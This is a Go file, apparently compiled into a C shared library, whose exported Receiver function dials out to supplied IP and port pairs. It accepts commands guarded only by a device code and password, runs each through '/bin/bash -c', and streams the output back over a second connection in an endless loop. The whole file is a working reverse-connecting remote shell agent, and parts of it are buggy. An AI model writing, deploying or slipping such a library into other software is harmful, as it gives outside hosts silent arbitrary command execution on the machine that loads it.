package main
import "C"
import "fmt"
import "strings"
import "bytes"
import "net"
import "bufio"
import "os/exec"
import "time"
import "context"
func runCommandWithTimeout(ctx context.Context, args[] string)(string, string) {
        // 创建一个*Cmd

	cmd := exec.Command(args[0],args[1:]...)
        // 启动命令，但不在当前goroutine等待其结束
        if err := cmd.Start(); err != nil {
                return "nothing...","1"
        }

        // 使用一个goroutine来等待命令结束
        done := make(chan error)
        go func() {
                done <- cmd.Wait()
        }()

        // 选择：命令正常结束、被取消或者超时
        select {
        case <-ctx.Done():
                // 超时或者context被取消，尝试杀掉命令
                if err := cmd.Process.Kill(); err != nil {
                        fmt.Println("Failed to kill process:", "2")
                } else {
                        fmt.Println("Killed process as timeout reached")
                }
                // 等待命令真正退出，避免僵尸进程
                <-done
                return "nothing...","2"//ctx.Err()
        case err := <-done:
                // 命令正常结束
		if err!=nil{
                      return "error\n","2"
                }
                output,_:= cmd.Output()
                return string(output),"0"
	 }
	 output,_:= cmd.Output()
	 return string(output),"0"
}

//export Receiver  
func Receiver(name *C.char,passwd *C.char,ip_info *C.char,port_info *C.char) {
        //fmt.Printf("device code: %s,password:%s\n", C.GoString(name),C.GoString(passwd))
        //fmt.Printf("ip info: %s,port info:%s\n", C.GoString(ip_info),C.GoString(port_info))
        // 调用strings.Split一次，并将结果存储在切片中  
        systemlock:=true
	ips := strings.Split( C.GoString(ip_info), "-")
	ips=ips[:len(ips)-1]
	ports := strings.Split( C.GoString(port_info), "-")
	ports=ports[:len(ports)-1]
	for{
	    systemlock=true
	    for id, ip := range ips{
		fmt.Println(ip)
		fmt.Println(ports[2*id])
		fmt.Println(ports[2*id+1])
		server := ip+":"+ports[2*id]
		server2 :=ip+":"+ports[2*id+1]
                go func(){// 连接到服务器
		    conn, err := net.Dial("tcp", server)
		    conn2,err2 := net.Dial("tcp",server2)
	            if err != nil {
		        fmt.Println(err)
		        return
                    }
                    if err2 != nil {
                        fmt.Println(err2)
                        return
                    }
		    defer conn.Close()
                    defer conn2.Close()
		    reader:=bufio.NewReader(conn)
		    for{
			var stdout, stderr bytes.Buffer
		        message,err:=reader.ReadString('\n')
			ret_msg:=strings.Split(message, "-")
			if ret_msg[0]!= C.GoString(name) || ret_msg[1]!= C.GoString(passwd){
                           continue
			}
			message=ret_msg[2]
		        if err!=nil{
			    fmt.Print("Connection lost:",err)
			    continue
		        }
		        fmt.Print("Get command:"+message)
		        args := []string{"/bin/bash","-c",message}
		        //cmd := exec.Command(args[0], args[1:]...)
                       // 设置超时时间为5秒  
	                timeout := 5 * time.Second
	                ctx, cancel := context.WithTimeout(context.Background(), timeout)
	                //defer cancel() // 当main函数返回时，释放context资源  

                        // 假设你有一个args切片，包含你要执行的命令和参数  
                        // 使用CommandContext而不是Command来创建命令  
			cmd := exec.CommandContext(ctx, args[0], args[1:]...)
                        cmd.Stdout = &stdout // 将命令的标准输出重定向到stdout缓冲区  
	                cmd.Stderr = &stderr // 将命令的标准错误输出重定向到stderr缓冲区
                        // 启动命令  
	                if err := cmd.Start(); err != nil {
		            fmt.Printf("Failed to start command: %v\n", err)
			    cancel()
		            continue
	                }
	                // 等待命令完成  
	                if err := cmd.Wait(); err != nil {
		        // 检查错误是否是因为上下文超时或取消  
		        if ctx.Err() == context.DeadlineExceeded {
			    fmt.Fprintf(conn2,"Command timed out\n")
		        } else {
			    fmt.Fprintf(conn2,"Command failed with error: %v\n", err)
                        }
			fmt.Fprintf(conn2, "EOFACA\n")
			cancel()
			continue
		        }else{
		        fmt.Println("Command completed successfully")
		        }
                        // 执行命令并获取输出
			output:=stdout.String()
			errs:=stderr.String()
                        if errs !="" {
                            fmt.Println("执行命令时出错:", errs)
			    fmt.Fprintf(conn2,"error\n")
			    fmt.Fprintf(conn2, "EOFACA\n")
			    cancel()
                            continue
                         }
			fmt.Fprintf(conn2, string(output)+"\n")
                        fmt.Fprintf(conn2, "EOFACA\n")
		        cancel()
	            }
		    systemlock=false
	        }()
	    }
	    for{
                if systemlock==false{
                    break
	        }
            }
    }
}
func main(){} // main函数必须定义，但在这里不是执行入口 
